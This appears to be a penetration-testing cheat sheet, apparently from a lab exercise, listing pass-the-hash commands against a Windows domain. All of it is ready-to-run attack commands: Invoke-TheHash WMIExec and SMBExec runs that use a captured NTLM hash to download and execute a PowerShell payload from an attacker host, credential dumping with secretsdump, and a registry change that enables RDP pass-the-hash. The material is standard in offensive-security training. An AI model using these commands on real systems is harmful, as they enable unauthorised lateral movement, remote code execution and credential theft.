# Pass the Hash

## Locally

<table><thead><tr><th width="227">Info</th><th>Command</th></tr></thead><tbody><tr><td>WMIExec 1 - Upload from Evil-WinRM</td><td><code>upload /home/kali/share/windows/privesc/Invoke-TheHash/Invoke-WMIExec.ps1</code></td></tr><tr><td>WMIExec 2 - Import Module</td><td><code>. ./Invoke-WMIExec.ps1</code></td></tr><tr><td>WMIExec 3 - Run Command</td><td><code>Invoke-WMIExec -Target dc01 -Domain heist.offsec -Username svc_apache$ -Hash 78bc82c952449150a12ad60e870a2be4 -Command 'powershell -ep bypass -Command "iex(iwr http://192.168.49.111:80 -UseBasicParsing)"' -verbose</code></td></tr><tr><td>SMBExec 1 - Upload from Evil-WinRM</td><td><code>upload /home/kali/share/windows/privesc/Invoke-TheHash/Invoke-SMBExec.ps1</code></td></tr><tr><td>SMBExec 2 - Import Module</td><td><code>. ./Invoke-SMBExec.ps1</code></td></tr><tr><td>SMBExec 3 - Run Command</td><td><code>Invoke-SMBExec -Target dc01 -Domain heist.offsec -Username svc_apache$ -hash 78bc82c952449150a12ad60e870a2be4 -Command 'powershell -ep bypass -Command "iex(iwr http://192.168.49.111:80/pc.ps1 -UseBasicParsing)"' -verbose</code></td></tr><tr><td>SMBEnum 1 - Upload from Evil-WinRM</td><td><code>upload /home/kali/share/windows/privesc/Invoke-TheHash/Invoke-SMBEnum.ps1</code></td></tr><tr><td>SMBEnum 2 - Import Module</td><td><code>. ./Invoke-SMBEnum.ps1</code></td></tr><tr><td>SMBEnum 3 - Run Command</td><td><code>Invoke-SMBEnum -Domain heist.offsec -Username svc_apache$ -Hash 78bc82c952449150a12ad60e870a2be4 -Target dc01 -verbose</code></td></tr><tr><td>SMBClient 1 - Upload from Evil-WinRM</td><td><code>upload /home/kali/share/windows/privesc/Invoke-TheHash/Invoke-SMBClient.ps1</code></td></tr><tr><td>SMBClient 2 - Import Module</td><td><code>. ./Invoke-SMBClient.ps1</code></td></tr><tr><td>SMBClient 3 - Run Command</td><td><code>Invoke-SMBClient -Domain heist.offsec -Username svc_apache$ -Hash 78bc82c952449150a12ad60e870a2be4 -Action Recurse -Source \\dc01.heist.offsec\C$\ -verbose</code></td></tr><tr><td>TheHash 1 - Upload from Evil-WinRM</td><td><code>upload /home/kali/share/windows/privesc/Invoke-TheHash/Invoke-TheHash.ps1</code></td></tr><tr><td>TheHash 2 - Import Module</td><td><code>. ./Invoke-TheHash.ps1</code></td></tr><tr><td>TheHash 3 - Run Command</td><td><code>Invoke-TheHash -Type WMIExec -Target dc01 -Username svc_apache$ -Hash 78bc82c952449150a12ad60e870a2be4</code></td></tr></tbody></table>

## Remotely

<table><thead><tr><th width="212">Info</th><th>Command</th></tr></thead><tbody><tr><td>crackmapexec</td><td><code>crackmapexec smb $ip -u $user -H $hash</code></td></tr><tr><td>psexec</td><td><code>psexec.py $user@$ip -hashes :$hash</code></td></tr><tr><td>secretsdump</td><td><code>secretsdump.py $user@$ip -hashes $hash</code></td></tr><tr><td>smbclient</td><td><code>smbclient //$ip/$share -U $user --pw-nt-hash $hash</code></td></tr><tr><td>WinRM</td><td><code>evil-winrm -i $ip -u $user -H $hash</code></td></tr><tr><td>wmiexec.py</td><td><code>wmiexec.py $user@$ip -hashes :$hash</code></td></tr><tr><td>xfreerdp 1 - Disable Restricted admin if required (Need admin)</td><td><code>cme smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'</code></td></tr><tr><td>xfreerdp 2</td><td><code>xfreerdp /v:$ip /u:$user /pth:$hash</code></td></tr></tbody></table>
